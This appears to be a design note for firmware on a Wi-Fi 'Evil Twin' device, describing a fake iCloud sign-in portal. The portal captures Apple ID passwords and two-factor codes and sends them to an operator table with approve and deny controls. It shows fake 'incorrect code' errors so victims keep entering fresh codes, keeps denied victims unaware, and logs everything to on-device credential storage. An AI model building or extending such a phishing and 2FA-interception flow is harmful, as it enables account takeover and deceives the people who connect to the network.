# iCloud portal flow (internal test build)

`data/icloud/index.html` implements a four-stage sign-in flow. All stages report
to the dashboard over the existing WebSocket channel; nothing leaves the device.

## Visitor side

1. **Credentials** — Apple ID + password. On submit the page sends
   `PORTAL_LOGIN` (cmd 34) and switches to a "请等待，正在连接…" spinner.
2. **2FA prompt** — after ~1.6 s the two-factor screen appears. The visitor
   enters a code (on-screen code or SMS code).
3. **Verifying** — on submit the page sends `PORTAL_OTP` (cmd 35) and shows the
   "正在连接…" spinner again.
4. **Retry** — five seconds later the code is rejected with "验证码不正确，请重试"
   and the code field returns, so the visitor can keep entering codes.
5. **Success** — the page polls `PORTAL_STATUS` (cmd 36) every 2 s. As soon as
   the operator approves, the visitor sees the "登录成功" screen.

## Operator side

Evil Twin view → **LOGIN ATTEMPTS** table (refreshes every 2 s):

| # | Apple ID | Password | 2FA Code | State | Action |
|---|---|---|---|---|---|

- `ALLOW` sends `PORTAL_DECIDE` with decision 1 → that visitor's page flips to
  the success screen on the next poll (≤2 s).
- `DENY` sends decision 2 → the visitor stays on the code screen, so they keep
  retrying; nothing tells them they were rejected.
- State column shows `Pending / Approved / Denied · creds / 2FA`.

## Firmware pieces

- `include/server_api.h`: `API_PORTAL_LOGIN` (34), `API_PORTAL_OTP` (35),
  `API_PORTAL_STATUS` (36), `API_PORTAL_SESSIONS` (37), `API_PORTAL_DECIDE` (38)
- `src/server_api.c`: 8-slot session table keyed by a client-generated
  `session` id; each step is also written to the SPIFFS credential log in the
  existing `<ssid>,<bssid>,<value>` shape, with the password redacted from UART
- unknown/evicted sessions are treated as pending, so a stale tab never shows
  success by accident
